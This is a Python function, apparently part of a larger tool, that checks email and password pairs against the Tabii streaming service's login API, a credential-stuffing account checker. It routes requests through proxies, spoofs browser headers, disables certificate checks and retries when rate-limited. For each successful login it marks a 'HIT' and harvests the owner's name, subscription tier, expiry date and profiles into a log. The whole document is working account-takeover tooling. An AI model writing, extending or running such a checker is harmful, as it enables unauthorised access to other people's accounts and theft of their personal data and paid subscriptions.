def check_tabii_account(email, password, proxy=None):
    """Tabii hesabını kontrol eder, 850 hatasını düzeltir."""
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://www.tabii.com",
        "Referer": "https://www.tabii.com/",
        "Accept-Language": "tr-TR,tr;q=0.9,en;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site"
    })
    
    if proxy:
        session.proxies = {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}"
        }
    
    session.verify = False
    session.timeout = (10, 30)  # connect, read timeout

    result = {
        "status": "ERROR",
        "details": {
            "full_name": "?",
            "subscription": "?",
            "premium": False,
            "expire": "?",
            "profiles_count": 0,
            "profiles": [],
            "products": []
        },
        "message": ""
    }

    try:
        # 1. LOGIN
        login_url = "https://eu1.tabii.com/apigateway/auth/v2/login"
        r = session.post(login_url, json={"email": email, "password": password}, timeout=30)
        
        if r.status_code == 429 or r.status_code == 850:
            # Rate limit veya 850 hatası – biraz bekle ve tekrar dene
            time.sleep(1)
            r = session.post(login_url, json={"email": email, "password": password}, timeout=30)
            
        if r.status_code != 200:
            result["status"] = "BAD"
            result["message"] = f"HTTP {r.status_code}"
            return result
            
        data = r.json()
        token = data.get("accessToken")
        if not token:
            result["status"] = "BAD"
            result["message"] = "Token missing"
            return result

        # 2. USER INFO
        headers = {"Authorization": f"Bearer {token}"}
        r = session.get("https://eu1.tabii.com/apigateway/auth/v2/me", headers=headers, timeout=20)
        if r.status_code != 200:
            result["status"] = "HIT"
            result["message"] = "Giriş başarılı (detaylar alınamadı)"
            return result

        user = r.json()
        name = user.get("name", "Unknown")
        surname = user.get("surname", "")
        full_name = f"{name} {surname}".strip()
        sub = user.get("subscription", {})
        subscription = sub.get("title", sub.get("name", "Free"))
        premium = subscription.lower() == "premium"
        expire = sub.get("expireDate", "")[:10] if sub.get("expireDate") else "N/A"

        # 3. PROFILES
        r = session.get("https://eu1.tabii.com/apigateway/profiles/v2/", headers=headers, timeout=15)
        profiles = []
        profiles_count = 0
        if r.status_code == 200:
            prof_data = r.json()
            if isinstance(prof_data, list):
                profiles = [p.get("name", "Profile") for p in prof_data]
                profiles_count = len(profiles)

        # 4. SUBSCRIPTION PRODUCTS
        r = session.get("https://eu1.tabii.com/apigateway/subscriptions/v1/products/", headers=headers, timeout=15)
        products = []
        if r.status_code == 200:
            prod_data = r.json()
            if isinstance(prod_data, list):
                products = [p.get("name", p.get("title", "?")) for p in prod_data]

        result["status"] = "HIT"
        result["message"] = "Giriş başarılı"
        result["details"]["full_name"] = full_name
        result["details"]["subscription"] = subscription
        result["details"]["premium"] = premium
        result["details"]["expire"] = expire
        result["details"]["profiles_count"] = profiles_count
        result["details"]["profiles"] = profiles
        result["details"]["products"] = products

        add_log(f"Tabii HIT: {email} | {full_name} | {subscription} | Profiles:{profiles_count}", "SUCCESS")

    except requests.exceptions.Timeout:
        result["status"] = "ERROR"
        result["message"] = "Timeout"
        add_log(f"Tabii timeout: {email}", "ERROR")
    except Exception as e:
        result["status"] = "ERROR"
        result["message"] = str(e)[:60]
        add_log(f"Tabii hata: {email} - {str(e)}", "ERROR")

    finally:
        session.close()

    return result
